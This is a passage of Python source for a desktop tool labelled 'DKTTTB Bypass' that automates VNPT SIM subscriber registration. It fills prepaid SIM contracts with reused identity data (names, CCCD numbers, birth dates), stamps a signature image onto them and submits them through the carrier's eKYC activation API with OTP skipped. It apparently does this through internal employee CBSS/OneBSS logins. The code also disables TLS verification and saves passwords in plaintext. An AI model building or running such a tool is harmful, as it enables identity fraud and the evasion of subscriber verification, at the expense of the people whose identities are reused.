        raise EsimRegistrationError(f'Thiếu Pillow để ghép ảnh chữ ký: {exc}') from exc

    signature_path = os.path.abspath(str(signature_file or ''))
    if not os.path.isfile(signature_path) or os.path.getsize(signature_path) <= 128:
        raise EsimRegistrationError(f'Ảnh chữ ký không tồn tại/rỗng: {signature_path}')

    is_contract = str(result.get('is_contract') or '2')
    template_path = _active_sim_contract_template(is_contract, config=config)
    try:
        contract = Image.open(template_path).convert('RGBA')
        signature = Image.open(signature_path).convert('RGBA')
    except Exception as exc:
        raise EsimRegistrationError(f'Không đọc được mẫu hợp đồng/ảnh chữ ký: {exc}') from exc

    # SignaturePad returns a transparent bitmap.  User-selected JPG/PNG files
    # often have a white canvas, so convert only near-white pixels to alpha.
    pixels = []
    for red, green, blue, alpha in signature.getdata():
        if red >= 245 and green >= 245 and blue >= 245:
            pixels.append((red, green, blue, 0))
        else:
            pixels.append((red, green, blue, alpha))
    signature.putdata(pixels)

    identity = result.get('identity') if isinstance(result.get('identity'), dict) else {}
    identity_response = result.get('identity_response') or {}

    def identity_text(key, *aliases):
        current = identity.get(key)
        if current not in (None, ''):
            return str(current).strip()
        return str(_esim_deep_find(identity_response, *aliases) or '').strip()

    full_name = identity_text('name', 'fullName', 'fullname', 'customerName', 'name', 'hoTen')
    identity_id = identity_text(
        'id', 'identityNumber', 'documentId', 'cccdNumber', 'identityNo', 'cardId')
    if not full_name or not identity_id:
        raise EsimRegistrationError(
            'Dữ liệu REUSE_INFO thiếu họ tên hoặc số CCCD; không thể lập hợp đồng hợp lệ.')

    birth_day = identity_text('birth_day', 'birthDay', 'birthday', 'dateOfBirth', 'ngaySinh')
    gender = identity_text('gender', 'gender', 'sex', 'gioiTinh')
    nationality = identity_text('nationality', 'nationality', 'quocTich') or 'Việt Nam'
    issue_date = identity_text('issue_date', 'issueDate', 'dateOfIssue', 'ngayCap')
    issue_place = identity_text('issue_place', 'issuePlace', 'placeOfIssue', 'noiCap')
    recent_location = identity_text(
        'recent_location', 'recentLocation', 'permanentAddress', 'address', 'diaChi')
    dgv_container = result.get('dgv_info') or {}
    dgv = _esim_deep_find(dgv_container, 'result') or {}
    if not isinstance(dgv, dict):
        dgv = {}

    def dgv_text(name):
        return str(dgv.get(name) or '').strip()

    def local_phone(value):
        value = str(value or '').strip()
        if value.startswith('+84'):
            return '0' + value[3:]
        if value.startswith('0084'):
            return '0' + value[4:]
        if value.startswith('84'):
            return '0' + value[2:]
        if len(value) == 9 and value.isdigit():
            return '0' + value
        return value

    def font(size):
        for font_path in (r'C:\Windows\Fonts\arial.ttf',
                          r'C:\Windows\Fonts\tahoma.ttf'):
            try:
                return ImageFont.truetype(font_path, size=size)
            except OSError:
                pass
        return ImageFont.load_default()

    now = __import__('datetime').datetime.now()
    draw = ImageDraw.Draw(contract)
    black = (0, 0, 0, 255)
    active_phone = local_phone(result.get('msisdn'))
    contact_phone = local_phone(result.get('contact_phone'))
    serial = str(result.get('serial') or result.get('serial_sim') or '')
    package_code = str(result.get('phone_package_code') or '')

    if is_contract == '1':
        # lapPhieuDkttTratruoc scales this portrait template to screen width and
        # positions fields in a 1080x1920 virtual coordinate system.
        width = 1080
        height = int(round(contract.height / contract.width * width))
        contract = contract.resize((width, height), Image.Resampling.LANCZOS)
        draw = ImageDraw.Draw(contract)
        sx, sy = width / 1080.0, height / 1920.0
        text_font = font(21)

        def put(x, y, value):
            draw.text((x * sx, y * sy), str(value or ''), fill=black, font=text_font)

        put(290, 213, dgv_text('TTKD_NAME'))
        put(670, 213, dgv_text('CCBS_CODE'))
        put(230, 243, dgv_text('DKDN_GPTL'))
        put(660, 243, dgv_text('DEPUTY_MOBILE'))
        put(180, 275, dgv_text('DKDN_GPTL_NOICAP'))
        put(720, 275, now.strftime('%Y%m%d%H%M%S'))
        put(180, 307, dgv_text('HOTLINE'))
        dgv_date = (dgv_text('DKDN_GPTL_DATE').split('/') + ['', '', ''])[:3]
        put(380, 307, dgv_date[0])
        put(410, 307, dgv_date[1])
        put(450, 307, dgv_date[2])
        address_parts = [part.strip() for part in dgv_text('ADDRESS').split(',') if part.strip()]
        put(640, 307, ', '.join(address_parts[:2]))
        put(640, 340, ', '.join(address_parts[2:4]))
        put(140, 340, dgv_text('PROVINCE'))
        put(675, 370, now.strftime('%d'))
        put(760, 370, now.strftime('%m'))
        put(840, 370, now.strftime('%Y'))
        put(150, 525, full_name)
        birth_parts = (birth_day.split('/') + ['', '', ''])[:3]
        put(660, 525, birth_parts[0])
        put(695, 525, birth_parts[1])
        put(735, 525, birth_parts[2])
        put(900, 525, gender)
        put(350, 557, identity_id)
        put(600, 557, issue_place)
        issue_parts = (issue_date.split('/') + ['', '', ''])[:3]
        put(925, 557, issue_parts[0])
        put(950, 557, issue_parts[1])
        put(980, 557, issue_parts[2])
        put(245, 587, recent_location)
        put(140, 616, nationality)
        put(450, 616, contact_phone)
        put(180, 710, active_phone)
        put(500, 710, serial)
        sign_size = (100, 100)
        sign_xy = (int(120 * sx), int(1730 * sy))
        name_xy = (90 * sx, 1900 * sy)
    else:
        # lapHopdongDkttTratruoc uses direct coordinates on this landscape
        # drawable.  These values mirror the Android Canvas calls.
        text_font = font(12)

        def put(x, y, value, small=False):
            draw.text((x, y), str(value or ''), fill=black,
                      font=(font(10) if small else text_font))

        put(220, 128, now.strftime('%Y%m%d%H%M%S'))
        put(225, 173, now.strftime('%d'))
        put(294, 173, now.strftime('%m'))
        put(352, 173, now.strftime('%Y'))
        put(402, 173, dgv_text('PROVINCE'))
        put(120, 217, full_name)
        put(120, 231, birth_day)
        put(352, 231, gender)
        put(496, 231, nationality)
        put(210, 246, identity_id)
        put(352, 246, issue_date)
        put(486, 246, issue_place, small=True)
        put(292, 262, recent_location)
        put(120, 290, contact_phone)
        put(340, 335, dgv_text('TTKD_NAME'))
        put(110, 379, dgv_text('ADDRESS'))
        put(210, 393, dgv_text('DKDN_GPTL'))
        put(384, 393, dgv_text('DKDN_GPTL_DATE'))
        put(504, 393, dgv_text('DKDN_GPTL_NOICAP'), small=True)
        put(143, 408, dgv_text('DEPUTY'))
        put(384, 408, dgv_text('DEPUTY_TITLE'))
        put(140, 438, dgv_text('STK'))
        put(370, 438, dgv_text('STK_BANK'), small=True)
        put(125, 453, dgv_text('DEPUTY_TAX_CODE'))
        put(125, 468, dgv_text('DEPUTY_MOBILE'))
        put(110, 588, active_phone)
        put(210, 588, package_code)
        put(310, 588, 'Bản thân')
        put(438, 588, 'x')
        sign_size = (200, 200)
        sign_xy = (760, 416)
        name_xy = (740, 480)

    signature.thumbnail(sign_size, Image.Resampling.LANCZOS)
    sign_canvas = Image.new('RGBA', sign_size, (255, 255, 255, 0))
    sign_canvas.alpha_composite(
        signature,
        ((sign_size[0] - signature.width) // 2,
         (sign_size[1] - signature.height) // 2),
    )
    contract.alpha_composite(sign_canvas, sign_xy)
    ImageDraw.Draw(contract).text(name_xy, full_name, fill=black, font=text_font)

    output = __import__('io').BytesIO()
    contract.convert('RGB').save(output, format='PNG', optimize=False)
    return output.getvalue(), template_path


def run_active_sim_submit_signature(config, signature_file,
                                    session_file=None, log_cb=print):
    """Submit the signed prepaid form through ACTIVE_SIM setupVideoCallVer2."""
    cfg = _esim_load_config(config)
    result_file = cfg.get('result_file') or os.path.join(
        HISTORY_DIR, 'active_sim_result.json')
    if not os.path.isabs(str(result_file)):
        result_file = os.path.join(BASE_DIR, str(result_file))
    if not os.path.isfile(result_file):
        raise EsimRegistrationError('Chưa có kết quả eKYC ACTIVE_SIM để ký.')
    try:
        with open(result_file, 'r', encoding='utf-8') as result_handle:
            result = json.load(result_handle)
    except Exception as exc:
        raise EsimRegistrationError(f'Không đọc được kết quả ACTIVE_SIM: {exc}') from exc
    if not isinstance(result, dict) or result.get('status') != 'active_sim_contract_pending_signature':
        raise EsimRegistrationError(
            'ACTIVE_SIM chưa ở trạng thái chờ chữ ký; hãy chạy eKYC và xác nhận thông tin trước.')
    if str(result.get('otp_required') or '0') != '0':
        raise EsimRegistrationError('Phiên ACTIVE_SIM này yêu cầu OTP theo phản hồi máy chủ.')

    image_bytes, template_path = _active_sim_render_signed_contract(
        result, signature_file, config=cfg)
    context = _active_sim_session_context(
        cfg, session_file=session_file, log_cb=log_cb)
    _http, _post_plain, post_encrypted = _active_sim_http_context(context)
    device_parts = str(context.get('device_info') or '').split('|')
    android_id = ''
    if len(device_parts) > 1 and device_parts[1]:
        android_id = device_parts[1]
    elif device_parts:
        android_id = device_parts[0]
    body = {
        'msisdn': str(result.get('msisdn') or ''),
        'session': str(context.get('session') or ''),
        'requestId': str(uuid.uuid4()),
        'transId': str(result.get('trans_id') or ''),
        'provinceCode': str(result.get('province_code') or ''),
        'mobileDecode': str(result.get('mobile_decode') or ''),
        'otp': '',
        'otpRequired': '0',
        'checkSum': str(result.get('check_sum') or ''),
        'img4Base64': base64.b64encode(image_bytes).decode('ascii'),
        'uuid': android_id,
        'version': '2',
    }
    required = ('msisdn', 'transId', 'provinceCode', 'checkSum', 'img4Base64', 'uuid')
    missing = [name for name in required if not str(body.get(name) or '').strip()]
    if missing:
        raise EsimRegistrationError(
            'Thiếu dữ liệu hợp đồng ACTIVE_SIM: ' + ', '.join(missing))

    log_cb('[ACTIVE_SIM] POST /tel_service/active_sim/v2/setupVideoCallVer2 '
           '(hợp đồng PNG đã có chữ ký, otpRequired=0)')
    response = post_encrypted(
        '/tel_service/active_sim/v2/setupVideoCallVer2', body,
        log_cb=log_cb, accepted_error_codes=('1', '2'))
    response_data = response.get('data') if isinstance(response, dict) else response
    is_video_call = str(_esim_deep_find(response_data, 'isVideoCall') or '')
    result.update({
        'ok': True,
        'status': ('active_sim_submitted'
                   if is_video_call in ('', '0') else 'active_sim_video_call_required'),
        'signature_submitted': True,
        'signature_file': os.path.basename(os.path.abspath(str(signature_file))),
        'contract_template': os.path.basename(template_path),
        'setup_request_id': body['requestId'],
        'setup_response': _active_sim_redact_tokens(response_data),
        'is_video_call': is_video_call,
    })
    _esim_save_result(result, result_file)
    if is_video_call not in ('', '0'):
        log_cb('[ACTIVE_SIM] Đã gửi hợp đồng; VNPT yêu cầu tiếp tục bước video call.')
    else:
        log_cb('[ACTIVE_SIM] Đã gửi hợp đồng có chữ ký; ACTIVE_SIM hoàn tất phía ứng dụng.')
    return result


def show_onebss_config_gui():
    """Dual CBSS/OneBSS login UI plus DKTTTB/eSIM/ACTIVE_SIM dashboard."""
    if '--no-gui' in sys.argv:
        return

    global ONEBSS_TOKEN, ONEBSS_DEVICE_ID
    try:
        import tkinter as tk
        from tkinter import scrolledtext as st_mod
        from tkinter import ttk
        import threading, time
    except ImportError:
        print("  [GUI] tkinter khong co")
        return

    # ----- Color theme -----
    BG = '#1e1e2e'; FG = '#cdd6f4'; CARD = '#313244'
    ACC = '#89b4fa'; OK = '#a6e3a1'; ERR = '#f38ba8'
    YEL = '#f9e2af'; BTN_BG = '#89b4fa'; BTN_FG = '#1e1e2e'
    SUB = '#6c7086'

    root = tk.Tk()
    root.title("DKTTTB + eSIM + Lịch sử My VNPT")
    root.configure(bg=BG)
    root.resizable(True, True)
    root.minsize(560, 520)

    # Closing the GUI must stop the batch, not merely close Tk's main thread.
    # ThreadPoolExecutor workers are non-daemon, and eKYC uses child processes,
    # so track both explicitly for a complete shutdown.
    _shutdown_event = threading.Event()
    _batch_stop_event = threading.Event()
    _child_processes = set()
    _child_process_lock = threading.RLock()
    _batch_executor = {'value': None}
    _batch_running = {'value': False}

    def _batch_cancelled():
        return _shutdown_event.is_set() or _batch_stop_event.is_set()

    def _terminate_active_children(grace_seconds=0.75):
        """Terminate only eKYC subprocesses spawned by this GUI."""
        with _child_process_lock:
            children = list(_child_processes)
        for child in children:
            try:
                if child.poll() is None:
                    child.terminate()
            except Exception:
                pass
        deadline = time.monotonic() + max(0.0, grace_seconds)
        for child in children:
            remaining = max(0.0, deadline - time.monotonic())
            try:
                child.wait(timeout=remaining)
            except Exception:
                try:
                    child.kill()
                except Exception:
                    pass
        return len(children)

    # ===== HELPERS =====
    def mklbl(p, text, fg=FG, size=10, bold=False, **kw):
        return tk.Label(p, text=text, bg=BG, fg=fg,
                        font=('Segoe UI', size, 'bold' if bold else 'normal'), **kw)
    def mkbtn(p, text, cmd, bg=BTN_BG, fg=BTN_FG, size=10, **kw):
        return tk.Button(p, text=text, command=cmd, bg=bg, fg=fg, relief='flat',
                         font=('Segoe UI', size, 'bold'), cursor='hand2',
                         activebackground=ACC, activeforeground=BTN_FG, padx=10, pady=5, **kw)
    def mkentry(p, show=None, width=36, **kw):
        e = tk.Entry(p, bg=CARD, fg=FG, insertbackground=FG, relief='flat',
                     font=('Consolas', 10), show=show, width=width, **kw)
        return e

    # ===== FRAMES =====
    # Header
    hdr = tk.Frame(root, bg='#181825', pady=8, padx=18)
    hdr.pack(fill='x')
    hdr_top = tk.Frame(hdr, bg='#181825')
    hdr_top.pack(fill='x')
    mklbl(hdr_top, "DKTTTB Bypass", fg=ACC, size=14, bold=True).pack(side='left')
    hdr_nav = tk.Frame(hdr_top, bg='#181825')
    hdr_nav.pack(side='right')
    hdr_status = mklbl(hdr, "  Sẵn sàng", fg=OK, size=9)
    hdr_status.pack(anchor='w', pady=(4,0))

    # Container (switchable frames)
    container = tk.Frame(root, bg=BG)
    container.pack(fill='both', expand=True, padx=18, pady=10)

    frames = {}

    def show_frame(name):
        for f in frames.values():
            f.pack_forget()
        frames[name].pack(fill='both', expand=True)

    # ----- FRAME: login -----
    f_login = tk.Frame(container, bg=BG)
    frames['login'] = f_login

    mklbl(f_login, "Dang nhap nguon anh thue bao", bold=True, size=12, fg=ACC).pack(anchor='w', pady=(0,8))

    login_tabs = ttk.Notebook(f_login)
    login_tabs.pack(fill='both', expand=True)
    mkbtn(
        f_login, 'Lịch sử hoạt động My VNPT',
        lambda: (show_frame('dashboard'), dash_tabs.select(tab_usage_history)),
        bg=CARD, fg=FG, size=9
    ).pack(anchor='w', pady=(8, 0))
    cbss_login_tab = tk.Frame(login_tabs, bg=BG, padx=12, pady=10)
    onebss_login_tab = tk.Frame(login_tabs, bg=BG, padx=12, pady=10)
    login_tabs.add(cbss_login_tab, text='CBSS truc tiep')
    login_tabs.add(onebss_login_tab, text='OneBSS Employ')
    onebss_parent = onebss_login_tab

    def open_cbss_login():
        show_frame('login')
        login_tabs.select(cbss_login_tab)

    def open_onebss_login():
        show_frame('login')
        login_tabs.select(onebss_login_tab)

    mkbtn(hdr_nav, "CBSS", open_cbss_login, size=9).pack(side='left', padx=(0,6))
    mkbtn(hdr_nav, "OneBSS", open_onebss_login, size=9).pack(side='left')

    # ----- TAB: CBSS truc tiep (cookie web, username + password + OTP/PIN) -----
    cbss_accounts, cbss_last_user = _CBSS_RUNTIME.saved_credentials()
    cbss_saved_password, cbss_saved_otp = _split_cbss_combined_password(
        cbss_accounts.get(cbss_last_user, '')
    )
    cbss_base_var = tk.StringVar(value=CBSS_BASE_URL)
    cbss_user_var = tk.StringVar(value=cbss_last_user)
    cbss_pass_var = tk.StringVar(value=cbss_saved_password)
    cbss_otp_var = tk.StringVar(value=cbss_saved_otp)
    cbss_status_var = tk.StringVar(value=_CBSS_RUNTIME.status)

    mklbl(cbss_login_tab, "Dang nhap CBSS truc tiep", bold=True, size=11, fg=ACC).pack(anchor='w', pady=(0,8))
    cbss_form = tk.Frame(cbss_login_tab, bg=BG)
    cbss_form.pack(fill='x')

    def _cbss_field(row, label, variable, show=None, width=36):
        mklbl(cbss_form, label, size=9).grid(row=row, column=0, sticky='w', padx=(0,8), pady=4)
        entry = tk.Entry(cbss_form, textvariable=variable, bg=CARD, fg=FG,
                         insertbackground=FG, relief='flat', show=show,
                         width=width, font=('Consolas', 10))
        entry.grid(row=row, column=1, sticky='ew', pady=4, ipady=4)
        return entry

    _cbss_field(0, 'Base URL:', cbss_base_var)
    mklbl(cbss_form, 'Tai khoan:', size=9).grid(row=1, column=0, sticky='w', padx=(0,8), pady=4)
    cbss_user_box = ttk.Combobox(cbss_form, textvariable=cbss_user_var,
                                 values=list(cbss_accounts), width=34)
    cbss_user_box.grid(row=1, column=1, sticky='ew', pady=4)
    cbss_pass_entry = _cbss_field(2, 'Mat khau:', cbss_pass_var, show='*')
    _cbss_field(3, 'OTP/PIN (6 so):', cbss_otp_var, width=16)
    cbss_form.columnconfigure(1, weight=1)

    def fill_cbss_account(_event=None):
        combined = cbss_accounts.get(cbss_user_var.get().strip())
        if combined is not None:
            password, otp = _split_cbss_combined_password(combined)
            cbss_pass_var.set(password)
            cbss_otp_var.set(otp)

    cbss_user_box.bind('<<ComboboxSelected>>', fill_cbss_account)
    cbss_show_pass_var = tk.BooleanVar(value=False)
    tk.Checkbutton(cbss_login_tab, text='Hien mat khau', variable=cbss_show_pass_var,
                   command=lambda: cbss_pass_entry.config(show='' if cbss_show_pass_var.get() else '*'),
                   bg=BG, fg=SUB, activebackground=BG, activeforeground=FG,
                   selectcolor=CARD, font=('Segoe UI', 8)).pack(anchor='w', pady=(4,0))
    cbss_status_label = mklbl(cbss_login_tab, cbss_status_var.get(), fg=YEL, size=9, wraplength=520)
    cbss_status_label.pack(fill='x', pady=(8,6))

    def publish_cbss_status(text):
        def update():
            cbss_status_var.set(str(text))
            cbss_status_label.config(text=str(text), fg=OK if 'da dang nhap' in str(text).lower() else YEL)
        try:
            root.after(0, update)
        except Exception:
            pass

    _CBSS_RUNTIME.subscribe(publish_cbss_status)

    def send_cbss_pin():
        username = cbss_user_var.get().strip()
        if not username:
            publish_cbss_status('CBSS: vui long nhap tai khoan truoc.')
            return
        _CBSS_RUNTIME.base_url = (cbss_base_var.get().strip() or CBSS_BASE_URL).rstrip('/')
        def worker():
            try:
                _CBSS_RUNTIME.send_pin(username)
            except Exception as exc:
                publish_cbss_status(f'CBSS: lay OTP/PIN loi - {exc}')
        threading.Thread(target=worker, name='cbss-send-pin', daemon=True).start()

    def login_cbss():
        username = cbss_user_var.get().strip()
        password = cbss_pass_var.get()
        otp = cbss_otp_var.get().strip()
        _CBSS_RUNTIME.base_url = (cbss_base_var.get().strip() or CBSS_BASE_URL).rstrip('/')
        def worker():
            try:
                _CBSS_RUNTIME.login(username, password, otp, save=True)
                def success_ui():
                    hdr_status.config(text=f'  CBSS: {username} - Da dang nhap', fg=OK)
                    current, _last = _CBSS_RUNTIME.saved_credentials()
                    cbss_accounts.clear(); cbss_accounts.update(current)
                    cbss_user_box.config(values=list(cbss_accounts))
                    show_frame('dashboard')
                root.after(0, success_ui)
            except Exception as exc:
                publish_cbss_status(f'CBSS: dang nhap loi - {exc}')
        threading.Thread(target=worker, name='cbss-login', daemon=True).start()

    def logout_cbss_from_login():
        _CBSS_RUNTIME.logout()
        hdr_status.config(text='  CBSS da dang xuat', fg=YEL)

    cbss_actions = tk.Frame(cbss_login_tab, bg=BG)
    cbss_actions.pack(fill='x', pady=(4,0))
    mkbtn(cbss_actions, 'Lay OTP/PIN', send_cbss_pin, bg=CARD, fg=FG, size=9).pack(side='left', padx=(0,6))
    mkbtn(cbss_actions, 'Dang nhap CBSS', login_cbss, size=9).pack(side='left')
    mkbtn(cbss_actions, 'Dang xuat', logout_cbss_from_login, bg=CARD, fg=FG, size=9).pack(side='left', padx=(6,0))
    mklbl(cbss_login_tab,
          'CBSS truc tiep can ket noi mang noi bo/VPN. Khi CBSS loi, chuong trinh se fallback sang OneBSS.',
          fg=SUB, size=8, wraplength=520, justify='left').pack(fill='x', pady=(12,0))

    mklbl(onebss_parent, "Dang nhap OneBSS Employ", bold=True, size=11, fg=ACC).pack(anchor='w', pady=(0,8))

    # ---- Saved accounts dropdown ---- (dung tk.OptionMenu thay vi ttk.Combobox de tranh Windows override dark theme)
    saved_accounts = _load_saved_config().get('accounts', [])

    acct_frame = tk.Frame(onebss_parent, bg=BG)
    acct_frame.pack(fill='x', pady=(0,10))
    mklbl(acct_frame, "Tai khoan da luu:", size=9, fg='#6c7086').pack(anchor='w')
    acct_row = tk.Frame(acct_frame, bg=BG)
    acct_row.pack(fill='x', pady=(2,0))

    acct_var = tk.StringVar(value=saved_accounts[0]['u'] if saved_accounts else '(Chua co)')
    acct_names = [a['u'] for a in saved_accounts] if saved_accounts else ['(Chua co)']
    acct_menu = tk.OptionMenu(acct_row, acct_var, *acct_names)
    acct_menu.config(bg=CARD, fg=FG, activebackground=ACC, activeforeground=BTN_FG,
                     relief='flat', font=('Consolas',9), highlightthickness=0,
                     indicatoron=1, width=26)
    acct_menu['menu'].config(bg=CARD, fg=FG, activebackground=ACC)
    acct_menu.pack(side='left', padx=(0,6))
    _HAS_COMBO = bool(saved_accounts)

    def on_acct_select(*args):
        u = acct_var.get()
        for a in saved_accounts:
            if a['u'] == u:
                e_user.delete(0,'end'); e_user.insert(0, a['u'])
                e_pass.delete(0,'end'); e_pass.insert(0, a['p'])
                break

    def del_acct():
        nonlocal saved_accounts
        u = acct_var.get()
        saved_accounts = [a for a in saved_accounts if a['u'] != u]
        old = _load_saved_config()
        old['accounts'] = saved_accounts
        with open(CONFIG_JSON,'w',encoding='utf-8') as f:
            json.dump(old, f, ensure_ascii=False, indent=2)
        # Cap nhat menu
        menu = acct_menu['menu']
        menu.delete(0,'end')
        names = [a['u'] for a in saved_accounts] if saved_accounts else ['(Chua co)']
        for n in names:
            menu.add_command(label=n, command=lambda v=n: acct_var.set(v))
        acct_var.set(names[0])
        if saved_accounts: on_acct_select()
        else: e_user.delete(0,'end'); e_pass.delete(0,'end')

    acct_var.trace_add('write', on_acct_select)
    tk.Button(acct_row, text="Xoa", command=del_acct,
              bg='#45475a', fg='#f38ba8', relief='flat',
              font=('Segoe UI',8), cursor='hand2', padx=6, pady=2).pack(side='left')

    mklbl(onebss_parent, "Ten dang nhap:").pack(anchor='w', pady=(4,0))
    e_user = mkentry(onebss_parent)
    e_user.pack(anchor='w', pady=(2,8), ipady=4)

    mklbl(onebss_parent, "Mat khau:").pack(anchor='w')
    e_pass = mkentry(onebss_parent, show='*')
    e_pass.pack(anchor='w', pady=(2,14), ipady=4)

    # Auto-fill again after widgets exist
    if _HAS_COMBO and saved_accounts:
        root.after(100, on_acct_select)

    login_status = mklbl(onebss_parent, "", fg=ERR, size=9)
    login_status.pack(anchor='w', pady=(0,6))

    def do_login():
        user = e_user.get().strip()
        pwd  = e_pass.get()
        if not user or not pwd:
            login_status.config(text="Vui long nhap day du thong tin", fg=ERR); return
        login_status.config(text="Dang dang nhap...", fg=YEL)
        root.update()
        import secrets as _sec
        device_id = ''.join([hex(b)[2:].zfill(2) for b in os.urandom(8)])
        _ONEBSS_SESSION['device_id'] = device_id
        try:
            r = requests.post(f"{ONEBSS_BASE}/quantri/user/xacthuc_tapdoan",
                headers={'Content-Type':'application/json','Accept':'application/json'},
                json={'username': user, 'password': pwd, 'os_type': '1', 'device_id': device_id},
                timeout=60, verify=False)
            d = r.json()
            if r.status_code == 200 and d.get('error_code') == 'BSS-00000000':
                _ONEBSS_SESSION['secret_code'] = d['data']['secretCode']
                login_status.config(text="Buoc 1 OK - Nhap OTP gui toi dien thoai/email", fg=OK)
                show_frame('otp')
            else:
                login_status.config(text=d.get('message','Sai tai khoan / mat khau'), fg=ERR)
        except Exception as ex:
            login_status.config(text=f"Loi: {ex}", fg=ERR)

    mkbtn(onebss_parent, "Dang nhap OneBSS", do_login).pack(anchor='w')

    # --- Token fallback ---
    sep = tk.Frame(onebss_parent, bg=CARD, height=1)
    sep.pack(fill='x', pady=12)
    mklbl(onebss_parent, "Hoac paste token OneBSS san co:", fg=SUB, size=9).pack(anchor='w')
    e_tok = tk.Text(onebss_parent, height=3, bg=CARD, fg=FG, insertbackground=FG,
                     relief='flat', font=('Consolas',8), wrap='word')
    e_tok.insert('1.0', ONEBSS_TOKEN)
    e_tok.pack(fill='x', pady=(4,6))

    def use_token():
        tok = e_tok.get('1.0','end').strip()
        if not tok:
            return
        _ONEBSS_SESSION['token'] = tok
        _ONEBSS_SESSION['logged_in'] = True
        hdr_status.config(text="  \u2705 Token da cap nhat", fg=OK)
        show_frame('dashboard')
    mkbtn(onebss_parent, "Dung token OneBSS nay", use_token, bg=CARD, fg=FG, size=9).pack(anchor='w')

    # ----- FRAME: OTP -----
    f_otp = tk.Frame(container, bg=BG)
    frames['otp'] = f_otp

    mklbl(f_otp, "Xc thực OTP", bold=True, size=12, fg=ACC).pack(anchor='w', pady=(0,12))
    mklbl(f_otp, "Ma OTP:").pack(anchor='w')
    e_otp = mkentry(f_otp, width=16)
    e_otp.pack(anchor='w', pady=(2,10), ipady=4)
    otp_status = mklbl(f_otp, "", fg=ERR, size=9)
    otp_status.pack(anchor='w', pady=(0,6))

    def do_otp():
        otp = e_otp.get().strip()
        if not otp:
            otp_status.config(text="Nhap ma OTP", fg=ERR); return
        otp_status.config(text="Dang xac thuc...", fg=YEL)
        root.update()
        try:
            r = requests.post(f"{ONEBSS_BASE}/quantri/oauth/token",
                headers={'Content-Type':'application/json','Accept':'application/json'},
                json={'grant_type':'password','client_id':'clientapp','client_secret':'password',
                      'secretCode': _ONEBSS_SESSION['secret_code'], 'otp': otp},
                timeout=60, verify=False)
            d = r.json()
            if r.status_code == 200 and d.get('access_token'):
                tok = d['access_token']
                _ONEBSS_SESSION['token'] = tok
                _ONEBSS_SESSION['logged_in'] = True
                # Luu token + tai khoan vao file JSON
                _save_config(tok, _ONEBSS_SESSION.get('device_id', ONEBSS_DEVICE_ID),
                             username=e_user.get().strip(), password=e_pass.get())
                otp_status.config(text="Dang nhap thanh cong! Da luu tai khoan.", fg=OK)
                # Token co the khong phai JWT chuan - hien thi user tu secret_code
                try:
                    sc = _ONEBSS_SESSION.get('secret_code','')
                    uname = sc.split(':')[6] if sc and len(sc.split(':')) > 6 else 'CCBS'
                except:
                    uname = 'CCBS'
                hdr_status.config(text=f"  \u2705 {uname} \u2014 Da dang nhap", fg=OK)
                root.after(600, lambda: show_frame('dashboard'))
            else:
                otp_status.config(text=d.get('message','OTP sai hoac het han'), fg=ERR)
        except Exception as ex:
            otp_status.config(text=f"Loi: {ex}", fg=ERR)

    mkbtn(f_otp, "  Xac nhan OTP  ", do_otp).pack(anchor='w')
    mkbtn(f_otp, "Quay lai", lambda: show_frame('login'), bg=CARD, fg=FG, size=9).pack(anchor='w', pady=(6,0))


    # ----- FRAME: Dashboard -----
    f_dash = tk.Frame(container, bg=BG)
    frames['dashboard'] = f_dash

    # Keep each business flow in its own tab so credentials, logs and controls
    # cannot be confused between DKTTTB, eSIM, ACTIVE_SIM and UPDATE_INFO.
    try:
        _tab_style = ttk.Style(root)
        _tab_style.theme_use('clam')
        _tab_style.configure('TNotebook', background=BG, borderwidth=0)
        _tab_style.configure('TNotebook.Tab', background=CARD, foreground=FG,
                             padding=(14, 7), font=('Segoe UI', 9, 'bold'))
        _tab_style.map('TNotebook.Tab', background=[('selected', ACC)],
                       foreground=[('selected', BTN_FG)])
    except Exception:
        pass

    dash_tabs = ttk.Notebook(f_dash)
    dash_tabs.pack(fill='both', expand=True)
    tab_dktttb = tk.Frame(dash_tabs, bg=BG)
    tab_esim = tk.Frame(dash_tabs, bg=BG)
    tab_active_sim = tk.Frame(dash_tabs, bg=BG)
    tab_update_info = tk.Frame(dash_tabs, bg=BG)
    tab_usage_history = tk.Frame(dash_tabs, bg=BG)
    dash_tabs.add(tab_dktttb, text='  DKTTTB  ')
    dash_tabs.add(tab_esim, text='  eSIM  ')
    dash_tabs.add(tab_active_sim, text='  KÍCH HOẠT SIM MỚI  ')
    dash_tabs.add(tab_update_info, text='  XÁC THỰC TTTB  ')
    dash_tabs.add(tab_usage_history, text='  LỊCH SỬ HOẠT ĐỘNG  ')

    # Shared status line remains visible regardless of the selected tab.
    dash_status = mklbl(f_dash, "Nhap so VNPT + mat khau, hoac Import TXT roi nhan CHAY.", fg=SUB, size=9)
    dash_status.pack(side='bottom', anchor='w', pady=(4, 0))

    #  Thread-safe log via queue 
    import queue as _q
    _log_queue = _q.Queue()

    def log(msg):
        _log_queue.put(str(msg))

    # eSIM uses its own queue and textbox so its API/OTP trace does not get
    # mixed into the DKTTTB log when both tabs are used in the same session.
    _esim_log_queue = _q.Queue()

    def esim_log(msg):
        _esim_log_queue.put(str(msg))

    _active_sim_log_queue = _q.Queue()

    def active_sim_log(msg):
        _active_sim_log_queue.put(str(msg))

    _update_info_log_queue = _q.Queue()

    def update_info_log(msg):
        _update_info_log_queue.put(str(msg))

    def _flush_esim_log():
        changed = False
        try:
            for _ in range(100):
                msg = _esim_log_queue.get_nowait()
                esim_log_area.config(state='normal')
                esim_log_area.insert('end', msg + '\n')
                changed = True
        except _q.Empty:
            pass
        except Exception:
            pass

        if changed:
            if esim_auto_scroll_var.get():
                esim_log_area.see('end')
            esim_log_area.config(state='disabled')
        elif esim_log_area.cget('state') != 'disabled':
            esim_log_area.config(state='disabled')

        root.after(80, _flush_esim_log)

    def _flush_log():
        changed = False
        try:
            for _ in range(100):  # drain up to 100 per tick
                msg = _log_queue.get_nowait()
                log_area.config(state='normal')
                log_area.insert('end', msg + '\n')
                changed = True
        except _q.Empty:
            pass
        except Exception:
            pass
            
        if changed:
            if auto_scroll_var.get():
                log_area.see('end')
            log_area.config(state='disabled')
        elif log_area.cget('state') != 'disabled':
            log_area.config(state='disabled')
            
        root.after(80, _flush_log)

    def _flush_active_sim_log():
        changed = False
        try:
            for _ in range(100):
                msg = _active_sim_log_queue.get_nowait()
                active_sim_log_area.config(state='normal')
                active_sim_log_area.insert('end', msg + '\n')
                changed = True
        except _q.Empty:
            pass
        except Exception:
            pass
        if changed:
            if active_sim_auto_scroll_var.get():
                active_sim_log_area.see('end')
            active_sim_log_area.config(state='disabled')
        elif active_sim_log_area.cget('state') != 'disabled':
            active_sim_log_area.config(state='disabled')
